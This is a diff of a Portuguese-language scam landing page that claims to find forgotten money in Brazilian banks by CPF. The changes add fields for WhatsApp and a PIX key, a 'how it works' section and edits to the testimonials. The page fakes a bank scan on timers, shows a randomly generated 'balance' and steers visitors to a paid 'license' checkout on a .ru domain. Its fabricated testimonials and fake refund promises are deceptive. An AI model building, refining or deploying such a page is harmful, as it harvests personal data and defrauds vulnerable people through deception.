@@ -70,13 +70,19 @@
 
         .depo-title { font-weight: 900; font-size: 17px; margin-bottom: 15px; border-left: 5px solid var(--primary); padding-left: 10px; }
         .card-depo { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid #eee; }
-        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; gap: 15px; align-items: baseline; }
+        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; gap: 15px; }
         .depo-header b { font-size: 14px; white-space: nowrap; }
         .depo-header span { font-size: 11px; font-weight: 700; color: #999; white-space: nowrap; }
         .val-rec { color: var(--secondary); font-weight: 900; font-size: 16px; }
         .depo-text { font-size: 13px; color: #555; line-height: 1.5; }
 
         .btn-more { width: 100%; padding: 12px; background: transparent; border: 2px solid #ddd; border-radius: 10px; color: #888; font-weight: 700; cursor: pointer; margin-bottom: 20px; }
+
+        .steps { background: #fff; border-radius: 20px; padding: 25px; margin: 30px 0; border: 1px solid #eee; }
+        .step-item { display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start; }
+        .step-num { background: var(--primary); color: #fff; width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; font-size: 20px; }
+        .step-info b { font-size: 16px; display: block; margin-bottom: 4px; }
+        .step-info p { font-size: 14px; line-height: 1.4; font-weight: 500; }
 
         #notification-box { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; border-radius: 12px; padding: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s ease; border-left: 5px solid var(--secondary); max-width: 400px; margin: 0 auto; }
         #notification-box.show { transform: translateY(0); }
@@ -98,6 +104,7 @@
         .audit-line span { color: #64748b; }
         .audit-line b { color: #1e293b; }
 
+        .pix-container { background: #f9f9f9; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-top: 15px; }
         .footer { text-align: center; padding: 40px 20px; font-size: 12px; color: #1e293b; border-top: 2px solid var(--primary); line-height: 1.8; background: #e2e8f0; font-weight: 700; }
     </style>
 </head>
@@ -143,6 +150,10 @@
                     <label>CPF PARA A CONSULTA</label>
                     <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14">
                 </div>
+                <div class="input-group">
+                    <label>WHATSAPP PARA RECEBER O PIX</label>
+                    <input type="tel" id="zap" placeholder="(00) 00000-0000">
+                </div>
                 <button class="btn-main" onclick="startScanner()">🔍 CONSULTAR MEU SALDO AGORA</button>
             </div>
 
@@ -168,17 +179,34 @@
             </div>
 
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
+
+            <div class="steps">
+                <div class="depo-title" style="border:none; padding:0;">Como funciona:</div>
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-info"><b>Consulta Gratuita</b><p style="color: #666;">Varredura em 14 instituições em tempo real.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-info"><b>Cálculo de Tarifas</b><p style="color: #666;">Localizamos juros de contas inativas.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-info"><b>Saque Imediato</b><p style="color: #666;">Transferência direta para sua chave PIX.</p></div>
+                </div>
+            </div>
         </div>
 
         <div id="step-2" style="display: none;">
             <div class="form-card" style="text-align: center;">
                 <div class="loader-circle"></div>
                 <h3>🔎 Consultando seu CPF...</h3>
-                <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px;">
+                <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px; border: 1px solid #eee;">
                     <div id="b-list">
                         <div class="bank-item" data-time="1500"><span>Banco do Brasil</span> <small>aguardando</small></div>
                         <div class="bank-item" data-time="2000"><span>Caixa Econômica</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1500"><span>Itaú Unibanco</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1500"><span>Bradesco</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="2000"><span>Itaú Unibanco</span> <small>aguardando</small></div>
                     </div>
                 </div>
             </div>
@@ -199,8 +227,9 @@
                     <div class="audit-line"><span>Expira em:</span> <b id="timer" style="color:var(--danger)">05:00</b></div>
                 </div>
 
-                <div style="background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px; font-size: 14px; text-align: center; margin-bottom: 20px;">
-                    Ative sua <b>Licença Individual</b> para liberar o saque. O valor de R$ 47,00 é 100% REEMBOLSÁVEL e volta no seu PIX.
+                <div class="pix-container">
+                    <label>Sua Chave PIX:</label>
+                    <input type="text" placeholder="CPF, E-mail ou Celular...">
                 </div>
 
                 <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" 
@@ -225,7 +254,6 @@
     </div>
 
     <script>
-        // Formatação CPF
         document.getElementById('cpf').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 11) v = v.slice(0, 11);
@@ -254,10 +282,8 @@
         function loadMoreDepos() {
             const container = document.getElementById('depo-container');
             const novos = [
-                {n: "Sandra Regina", l: "Santos - SP", v: "1.650,10", t: "Fiz a consulta e o valor do meu FGTS inativo apareceu. Licença paga e dinheiro na conta."},
-                {n: "Luiz Gustavo", l: "Campinas - SP", v: "3.120,45", t: "Estava precisando muito, a licença compensa demais pelo valor que recebi."},
-                {n: "Mariana Silva", l: "Vitória - ES", v: "980,00", t: "Muito prático. Podem confiar que o valor da licença volta junto no PIX."},
-                {n: "Edson Jr.", l: "Natal - RN", v: "2.440,30", t: "Achei dinheiro de uma conta que fechei em 2019. Roberto é fera!"}
+                {n: "Sandra Regina", l: "Santos - SP", v: "1.650,10", t: "Fiz a consulta e o valor do meu FGTS inativo apareceu."},
+                {n: "Luiz Gustavo", l: "Campinas - SP", v: "3.120,45", t: "Estava precisando muito, a licença compensa demais."}
             ];
             novos.forEach(d => {
                 const div = document.createElement('div');
@@ -290,7 +316,6 @@
             const total = Math.random() * (2890 - 1100) + 1100;
             const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
-            document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
             window.scrollTo(0,0);
